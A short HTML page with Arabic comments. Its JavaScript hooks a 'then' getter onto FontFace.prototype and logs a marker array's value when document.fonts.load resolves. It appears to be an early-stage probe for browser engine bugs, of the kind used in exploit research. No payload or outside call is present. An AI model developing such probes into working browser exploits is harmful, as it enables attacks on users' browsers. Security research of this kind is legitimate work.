<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log" style="font-size: 1.2em;"></div>
    <script>
        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

        let A = new FontFace('x', 'local(Arial)', {});
        document.fonts.add(A);
        
        let probe = new Uint32Array(0x100);
        probe[0] = 0x12345678;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                // طباعة القيمة الحالية للمصفوفة فور الوصول للفخ
                log("تم اعتراض الوصول! قيمة المصفوفة الحالية هي: " + probe[0].toString(16));
                return undefined;
            }
        });

        log("بدء التحميل...");
        document.fonts.load('1em x', 'AB');
    </script>
</body>
</html>
